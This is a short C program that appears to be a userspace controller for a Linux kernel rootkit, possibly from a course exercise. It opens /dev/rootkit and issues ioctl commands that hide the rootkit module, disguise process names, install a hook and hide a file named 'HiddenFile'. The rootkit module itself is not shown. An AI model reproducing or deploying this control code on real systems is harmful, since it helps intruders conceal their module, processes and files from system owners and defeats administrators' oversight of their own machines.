#include <stdio.h>
#include <fcntl.h>      // for O_RDWR
#include <unistd.h>     // for close()
#include <sys/ioctl.h>  // for ioctl()
#include <stdlib.h>
#include <string.h>
#include "rootkit.h"


int main(int argc, char *argv[]) {
    int fd;
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <command>\n", argv[0]);
        return 1;
    }

    fd = open("/dev/rootkit", O_RDWR);
    if (fd == -1) {
        perror("open");
        return 1;
    }
    // 使用 IOCTL_MOD_HIDE 命令
    if (strcmp(argv[1], "0") == 0) {
        if (ioctl(fd, IOCTL_MOD_HIDE) < 0) {
            printf("IOCTL_MOD_HIDE failed\n");
        }
    }else if (strcmp(argv[1], "1") == 0) {
        struct masq_proc proc1 = {
            "NTU", 
            "NTUST"
        };
        struct masq_proc proc2 = {
            "Standford", 
            "MIT"
        };

        // 創建 masq_proc_req
        struct masq_proc_req req;
        req.len = 2;
        req.list = (struct masq_proc *)malloc(req.len * sizeof(struct masq_proc));

        if (req.list == NULL) {
            fprintf(stderr, "Memory allocation failed\n");
            return 1;
        }
        req.list[0] = proc1;
        req.list[1] = proc2;

        // Populate req with necessary data
        ioctl(fd, IOCTL_MOD_MASQ, &req);
        free(req.list);
    } else if (strcmp(argv[1], "2") == 0) {
        ioctl(fd, IOCTL_MOD_HOOK);
    } else if (strcmp(argv[1], "3") == 0) {
        // hide "HiddenFile"
        struct hided_file file = {
            11,
            "HiddenFile"
        };
        ioctl(fd, IOCTL_FILE_HIDE, &file);
    } else {
        fprintf(stderr, "Invalid command.\n");
        close(fd);
        return 1;
    }

    close(fd);
    return 0;
}
